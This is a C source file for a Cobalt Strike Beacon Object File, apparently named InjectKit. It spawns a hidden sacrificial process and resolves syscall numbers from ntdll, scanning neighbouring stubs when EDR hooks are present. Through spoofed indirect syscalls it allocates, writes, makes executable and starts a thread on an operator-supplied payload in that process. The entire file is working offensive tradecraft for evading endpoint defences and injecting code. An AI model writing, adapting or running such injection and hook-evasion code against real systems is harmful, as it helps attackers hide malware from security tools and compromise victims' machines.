#include <windows.h>
#include <stdint.h>
#include <stdio.h>
#include <stdarg.h>
#include "structs.h"
#include "beacon.h"

#define UP -32
#define DOWN 32

// C implemenantion of the tartarus assembly code
DWORD id = 0;
LPVOID jmptofake = 0;
EXTERN_C void setup(DWORD new_id, LPVOID new_jmptofake) {
    __asm__(
        "mov %[id], %[new_id] \n"
        "mov %[jmptofake], %[new_jmptofake]"
        : [id] "=m" (id), [jmptofake] "=m" (jmptofake) 
        : [new_id] "r" (new_id), [new_jmptofake] "r" (new_jmptofake) 
    );
}
extern NTSTATUS __attribute__((naked)) executioner(HANDLE pHandle, ...) {
    __asm__(
        "mov r10, rcx \n"
        "mov eax, %[id] \n"
        "jmp %[jmptofake] \n"
        :
        : [id] "m" (id), [jmptofake] "m" (jmptofake)
        : "r10", "eax"
    );
    __asm__ __volatile__("ret");
}

// fetch the syscall ID
BOOL GetSyscallId(PVOID pModuleBase, DWORD* SyscallId, PCHAR fnctolookfor) {
	char* pBaseAddr = (char*)pModuleBase;
	IMAGE_DOS_HEADER* pDosHdr = (IMAGE_DOS_HEADER*)pBaseAddr;
	IMAGE_NT_HEADERS* pNTHdr = (IMAGE_NT_HEADERS*)(pBaseAddr + pDosHdr->e_lfanew);
	IMAGE_OPTIONAL_HEADER* pOptionalHdr = &pNTHdr->OptionalHeader;
	IMAGE_DATA_DIRECTORY* pExportDataDir = (IMAGE_DATA_DIRECTORY*)(&pOptionalHdr->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]);
	IMAGE_EXPORT_DIRECTORY* pExportDirAddr = (IMAGE_EXPORT_DIRECTORY*)(pBaseAddr + pExportDataDir->VirtualAddress);

	DWORD* pEAT = (DWORD*)(pBaseAddr + pExportDirAddr->AddressOfFunctions);
	DWORD* pFuncNameTbl = (DWORD*)(pBaseAddr + pExportDirAddr->AddressOfNames);
	WORD* pHintsTbl = (WORD*)(pBaseAddr + pExportDirAddr->AddressOfNameOrdinals);
	for (WORD cx = 0; cx < pExportDirAddr->NumberOfNames; cx++) {
		PCHAR pczFunctionName = (PCHAR)((PBYTE)pBaseAddr + pFuncNameTbl[cx]);
		PVOID pFunctionAddress = (PBYTE)pBaseAddr + pEAT[pHintsTbl[cx]];
		if (MSVCRT$strcmp(pczFunctionName, fnctolookfor) == 0) {
			if (*((PBYTE)pFunctionAddress) == 0x4c
				&& *((PBYTE)pFunctionAddress + 1) == 0x8b
				&& *((PBYTE)pFunctionAddress + 2) == 0xd1
				&& *((PBYTE)pFunctionAddress + 3) == 0xb8
				&& *((PBYTE)pFunctionAddress + 6) == 0x00
				&& *((PBYTE)pFunctionAddress + 7) == 0x00) {

				BYTE high = *((PBYTE)pFunctionAddress + 5);
				BYTE low = *((PBYTE)pFunctionAddress + 4);
				*SyscallId = (high << 8) | low;

				return TRUE;
			}
			//if hooked check the neighborhood to find clean syscall
			if (*((PBYTE)pFunctionAddress) == 0xe9) {
				for (WORD idx = 1; idx <= 500; idx++) {
					// check neighboring syscall down
					if (*((PBYTE)pFunctionAddress + idx * DOWN) == 0x4c
						&& *((PBYTE)pFunctionAddress + 1 + idx * DOWN) == 0x8b
						&& *((PBYTE)pFunctionAddress + 2 + idx * DOWN) == 0xd1
						&& *((PBYTE)pFunctionAddress + 3 + idx * DOWN) == 0xb8
						&& *((PBYTE)pFunctionAddress + 6 + idx * DOWN) == 0x00
						&& *((PBYTE)pFunctionAddress + 7 + idx * DOWN) == 0x00) {
						BYTE high = *((PBYTE)pFunctionAddress + 5 + idx * DOWN);
						BYTE low = *((PBYTE)pFunctionAddress + 4 + idx * DOWN);
						*SyscallId = (high << 8) | low - idx;

						return TRUE;
					}
					// check neighboring syscall up
					if (*((PBYTE)pFunctionAddress + idx * UP) == 0x4c
						&& *((PBYTE)pFunctionAddress + 1 + idx * UP) == 0x8b
						&& *((PBYTE)pFunctionAddress + 2 + idx * UP) == 0xd1
						&& *((PBYTE)pFunctionAddress + 3 + idx * UP) == 0xb8
						&& *((PBYTE)pFunctionAddress + 6 + idx * UP) == 0x00
						&& *((PBYTE)pFunctionAddress + 7 + idx * UP) == 0x00) {
						BYTE high = *((PBYTE)pFunctionAddress + 5 + idx * UP);
						BYTE low = *((PBYTE)pFunctionAddress + 4 + idx * UP);
						*SyscallId = (high << 8) | low + idx;

						return TRUE;
					}

				}
				return FALSE;
			}
			if (*((PBYTE)pFunctionAddress + 3) == 0xe9) {
				for (WORD idx = 1; idx <= 500; idx++) {
					// check neighboring syscall down
					if (*((PBYTE)pFunctionAddress + idx * DOWN) == 0x4c
						&& *((PBYTE)pFunctionAddress + 1 + idx * DOWN) == 0x8b
						&& *((PBYTE)pFunctionAddress + 2 + idx * DOWN) == 0xd1
						&& *((PBYTE)pFunctionAddress + 3 + idx * DOWN) == 0xb8
						&& *((PBYTE)pFunctionAddress + 6 + idx * DOWN) == 0x00
						&& *((PBYTE)pFunctionAddress + 7 + idx * DOWN) == 0x00) {
						BYTE high = *((PBYTE)pFunctionAddress + 5 + idx * DOWN);
						BYTE low = *((PBYTE)pFunctionAddress + 4 + idx * DOWN);
						*SyscallId = (high << 8) | low - idx;
						return TRUE;
					}
					// check neighboring syscall up
					if (*((PBYTE)pFunctionAddress + idx * UP) == 0x4c
						&& *((PBYTE)pFunctionAddress + 1 + idx * UP) == 0x8b
						&& *((PBYTE)pFunctionAddress + 2 + idx * UP) == 0xd1
						&& *((PBYTE)pFunctionAddress + 3 + idx * UP) == 0xb8
						&& *((PBYTE)pFunctionAddress + 6 + idx * UP) == 0x00
						&& *((PBYTE)pFunctionAddress + 7 + idx * UP) == 0x00) {
						BYTE high = *((PBYTE)pFunctionAddress + 5 + idx * UP);
						BYTE low = *((PBYTE)pFunctionAddress + 4 + idx * UP);
						*SyscallId = (high << 8) | low + idx;
						return TRUE;
					}

				}
				return FALSE;
			}
		}
	}

	return TRUE;
}


// check if this a x64 BOF (default CS code)
BOOL is_x64() {
#if defined _M_X64
    return TRUE;
#elif defined _M_IX86
    return FALSE;
#endif
}
 
void go(char * args, int alen, BOOL x86) {
    STARTUPINFOA        si;
    PROCESS_INFORMATION pi;
    datap               parser;
    short               ignoreToken;
    char *              dllPtr;
    int                 dllLen;
 
    // warn about crossing to another architecture (default CS code)
    if (!is_x64() && x86 == FALSE) {
        BeaconPrintf(CALLBACK_ERROR, "Warning: inject from x86 -> x64");
    }
    if (is_x64() && x86 == TRUE) {
        BeaconPrintf(CALLBACK_ERROR, "Warning: inject from x64 -> x86");
    }
 
    // extract the arguments 
    BeaconDataParse(&parser, args, alen);
    ignoreToken = BeaconDataShort(&parser);
    dllPtr = BeaconDataExtract(&parser, &dllLen);
 
    // setup the startup info structure (default CS code)
    __stosb((void *)&si, 0, sizeof(STARTUPINFO));
    __stosb((void *)&pi, 0, sizeof(PROCESS_INFORMATION));
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.cb = sizeof(STARTUPINFO);
 
    // spawn temp process (fork&run) (default CS code)
    if (!BeaconSpawnTemporaryProcess(x86, ignoreToken, &si, &pi)) {
        BeaconPrintf(CALLBACK_ERROR, "Unable to spawn %s temporary process.", x86 ? "x86" : "x64");
        return;
    }
   
   // calculate spoofJump address
   	HMODULE hNtdll = KERNEL32$GetModuleHandleA("ntdll.dll");
    DWORD SyscallId = 0;
    LPVOID spoofJump = ((char*)KERNEL32$GetProcAddress(hNtdll, "NtAddBootEntry")) + 18; 
   
    // allocate memory
    LPVOID pAddress = NULL;
    SIZE_T code_len = dllLen;
    GetSyscallId(hNtdll, &SyscallId, (PCHAR)"ZwAllocateVirtualMemory"); 
    setup(SyscallId, spoofJump);
    NTSTATUS status = executioner(pi.hProcess, &pAddress, NULL, &code_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); 

    // write code
    GetSyscallId(hNtdll, &SyscallId, (PCHAR)"NtWriteVirtualMemory"); 
    setup(SyscallId, spoofJump);
    status = executioner(pi.hProcess, pAddress, dllPtr, code_len, NULL); 
	
    // set PAGE_EXECUTE_READ
    DWORD oldProt;
    GetSyscallId(hNtdll, &SyscallId, (PCHAR)"NtProtectVirtualMemory");
    setup(SyscallId, spoofJump);
    status = executioner(pi.hProcess ,&pAddress, &code_len, PAGE_EXECUTE_READ, &oldProt);
	
    // start thread
    HANDLE hThread = NULL;
    GetSyscallId(hNtdll, &SyscallId, (PCHAR)"NtCreateThreadEx");
    setup(SyscallId, spoofJump);
    status = executioner(&hThread, 0x1FFFFF, NULL, pi.hProcess, pAddress, NULL, FALSE, NULL, NULL, NULL, NULL);

    // close handle
    GetSyscallId(hNtdll, &SyscallId, (PCHAR)"NtClose");
    setup(SyscallId, spoofJump);
    status = executioner(pi.hProcess);
   
    // cleanup process
    BeaconCleanupProcess(&pi);
	
    BeaconPrintf(CALLBACK_OUTPUT, "[InjectKit] Operation successfully executed!\n"); //DEBUG
}
 
void gox86(char * args, int alen) {
    go(args, alen, TRUE);
}
 
void gox64(char * args, int alen) {
    go(args, alen, FALSE);
}

